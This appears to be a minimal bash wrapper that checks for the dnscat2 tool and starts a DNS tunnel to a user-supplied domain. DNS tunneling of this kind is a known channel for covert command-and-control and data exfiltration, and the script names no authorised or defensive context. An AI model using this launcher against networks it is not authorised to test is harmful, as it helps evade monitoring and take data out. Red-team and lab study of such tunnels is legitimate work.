#!/bin/bash
# DNScat2 - DNS Tunneling
# Options:
# -d : Domain to use for tunneling

# Usage: dnscat2.sh <domain>
# Example script
# dnscat2.sh example.com

# Check if dnscat2 is installed
if ! command -v dnscat2 &> /dev/null
then
    echo "dnscat2 could not be found, please install it first."
    exit
fi

# Ensure domain is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <domain>"
    exit 1
fi

DOMAIN=$1

echo "Starting DNS tunneling using domain $DOMAIN"

# Perform DNS tunneling
dnscat2 --dns $DOMAIN

echo "DNS tunneling completed."
